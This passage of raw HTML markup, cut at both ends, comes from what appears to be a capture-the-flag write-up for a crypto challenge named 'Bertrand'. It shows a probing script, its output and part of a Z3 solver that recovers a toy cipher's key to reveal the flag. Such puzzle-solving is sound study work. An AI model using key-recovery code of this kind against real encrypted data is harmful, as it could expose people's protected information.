style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">base.append((i, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">chr\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(v)))\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">l.append(i)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(base)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(l)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'------------------------'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">diffs \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> []\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> key \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\x00\\x00\\x00\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\x00\\x00\\x01\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\x00\\x01\\x00\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\x01\\x00\\x00\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">n \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">256\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">msg \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'CCTF{'\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">baseline \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> do(n, msg, key, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">TEMP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">idk \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [baseline[i] \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> l]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(idk)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">diffs.append(idk)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> p, f \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">zip\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(diffs, [diffs[\u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]]\u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#79B8FF\">len\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(diffs)):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">([p[i] \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> f[i] \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">len\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(p))])\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"n = 256msg = &#x27;ABCDE&#x27;TEMP = &#x27;\\1\\2\\3&#x27;baseline = do(n, msg, &#x27;\\0\\0\\0&#x27;, TEMP)base = []l = []for i, v in enumerate(baseline):  if v > 1:    base.append((i, chr(v)))    l.append(i)print(base)print(l)print(&#x27;------------------------&#x27;)diffs = []for key in [&#x27;\\x00\\x00\\x00&#x27;, &#x27;\\x00\\x00\\x01&#x27;, &#x27;\\x00\\x01\\x00&#x27;, &#x27;\\x01\\x00\\x00&#x27;]:  n = 256  msg = &#x27;CCTF{&#x27;  baseline = do(n, msg, key, TEMP)  idk = [baseline[i] for i in l]  print(idk)  diffs.append(idk)for p, f in zip(diffs, [diffs[0]]*len(diffs)):  print([p[i] - f[i] for i in range(len(p))])\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"console\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0\">abhi@abhi-omen:~/CryptoCTF/bert/Bertrand\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">$ python solve.py\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">[(0, 'A'), (7282, 'D'), (19418, 'C'), (24273, 'B'), (31555, 'E')]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">[0, 7282, 19418, 24273, 31555]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">------------------------\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">[67, 70, 84, 67, 123]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">[67, 70, 86, 67, 123]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">[67, 72, 84, 68, 126]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">[70, 71, 85, 69, 123]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">[0, 0, 0, 0, 0]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">[0, 0, 2, 0, 0]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">[0, 2, 0, 1, 3]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">[3, 1, 1, 2, 0]\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"abhi@abhi-omen:~/CryptoCTF/bert/Bertrand$ python solve.py[(0, &#x27;A&#x27;), (7282, &#x27;D&#x27;), (19418, &#x27;C&#x27;), (24273, &#x27;B&#x27;), (31555, &#x27;E&#x27;)][0, 7282, 19418, 24273, 31555]------------------------[67, 70, 84, 67, 123][67, 70, 86, 67, 123][67, 72, 84, 68, 126][70, 71, 85, 69, 123][0, 0, 0, 0, 0][0, 0, 2, 0, 0][0, 2, 0, 1, 3][3, 1, 1, 2, 0]\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>Each line of this output gives us information to figure out how to decode the key. \u003Ccode>TEMP\u003C/code> is the current key permutation we are assuming the key has. So \u003Ccode>TEMP = '\\1\\2\\3'\u003C/code> assumes the permutation \u003Ccode>123\u003C/code>.\u003C/p>\n\u003Cp>The first line gives us the ordering of how the first 5 characters of the message will be in the final encrypted message. The second line tells us which indexes the first 5 message characters will be. We then print the encryption for the flags \u003Ccode>\\0\\0\\0\u003C/code>, \u003Ccode>\\0\\0\\1\u003C/code>, \u003Ccode>\\0\\1\\0\u003C/code>, \u003Ccode>\\1\\0\\0\u003C/code>. \u003Ccode>000\u003C/code> is the baseline. This will perform no encryption on the flag since it will add 0 every round. The next 3 keys will show us how each character of the key will affect each character of the encrypted message. This will give us a series of linear equations for key character of the key. For example, the above permutations map to,\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#99A0A6\"># [0, 0, 2, 0, 0]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#99A0A6\"># [0, 2, 0, 1, 3]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#99A0A6\"># [3, 1, 1, 2, 0]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">m0_shift_back\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(a):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">shift \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">3\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">4\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [a[s] \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> s \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> shift]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">solve_key_0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(ct_fixed, pt):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(pt)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(ct_fixed)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">solver \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> Solver()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF\">vars\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [Int(\u003C/span>\u003Cspan style=\"--0:#F97583\">f\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'k_\u003C/span>\u003Cspan style=\"--0:#79B8FF\">{\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x\u003C/span>\u003Cspan style=\"--0:#79B8FF\">}\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">3\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">k0, k1, k2 \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">vars\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">N \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">256\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">solver.add(k0 \u003C/span>\u003Cspan style=\"--0:#F97583\">>=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, k1 \u003C/span>\u003Cspan style=\"--0:#F97583\">>=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, k2 \u003C/span>\u003Cspan style=\"--0:#F97583\">>=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">solver.add(k0 \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">128\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, k1 \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">128\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, k2 \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">128\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">solver.add(ct_fixed[\u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">] \u003C/span>\u003Cspan style=\"--0:#F97583\">==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (pt[\u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">] \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">3\u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">k2) \u003C/span>\u003Cspan style=\"--0:#F97583\">%\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> N)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">solver.add(ct_fixed[\u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">] \u003C/span>\u003Cspan style=\"--0:#F97583\">==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (pt[\u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">] \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> k1 \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">k2) \u003C/span>\u003Cspan style=\"--0:#F97583\">%\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> N)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">solver.add(ct_fixed[\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">] \u003C/span>\u003Cspan style=\"--0:#F97583\">==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (pt[\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">] \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">k0 \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> k2) \u003C/span>\u003Cspan style=\"--0:#F97583\">%\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> N)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">solver.add(ct_fixed[\u003C/span>\u003Cspan style=\"--0:#79B8FF\">3\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">] \u003C/span>\u003Cspan style=\"--0:#F97583\">==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (pt[\u003C/span>\u003Cspan style=\"--0:#79B8FF\">3\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">] \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">k1 \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> k2) \u003C/span>\u003Cspan style=\"--0:#F97583\">%\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> N)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">solver.add(ct_fixed[\u003C/span>\u003Cspan style=\"--0:#79B8FF\">4\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">] \u003C/span>\u003Cspan style=\"--0:#F97583\">==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (pt[\u003C/span>\u003Cspan style=\"--0:#79B8FF\">4\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">] \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">3\u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">k1) \u003C/span>\u003Cspan style=\"--0:#F97583\">%\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> N)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(solver.check())\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">assert\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> solver.check() \u003C/span>\u003Cspan style=\"--0:#F97583\">==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> sat\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">m \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> solver.model()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(m)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">.join(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">chr\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(m[x].as_long()) \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">reversed\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">vars\u003C/span>\u003Cspan 